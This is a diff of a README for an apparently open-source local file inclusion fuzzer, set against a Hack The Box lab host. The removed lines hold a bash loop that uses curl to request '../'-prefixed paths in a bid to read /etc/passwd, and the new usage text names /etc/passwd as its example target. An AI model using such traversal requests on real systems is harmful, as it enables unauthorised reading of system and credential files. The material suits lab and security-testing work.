@@ -14,17 +14,14 @@ There are 3 adjustable arguments in this script, they are:
 
 **{PARAMETER}** - This is the parameters to fuzz, such as a page=/
 
-**Useage Example**
+**Useage**
 
 ```
-for i in {1..10}; do
-  url="http://bagel.htb:8000/?page=etc/passwd"               
-  for ((j=0; j<i; j++)); do
-    url="${url%\?page=*}?page=../${url#*\?page=}"
-  done
-  curl "$url" -o -
-  echo "$url" " => $i"
-done
+Options:
+  -u, --url       target URL        Example: http://google.com/parameter?search=
+  -f, --file      target file       Example: /etc/passwd
+  -a, --attempts  number of attempts (default: 10)         
+  -h, --help      display help text
 ```
 
 https://github.com/Jtgit4/LFI_Searcher/assets/125322633/459ad897-7433-4753-8cad-890f03b95aea
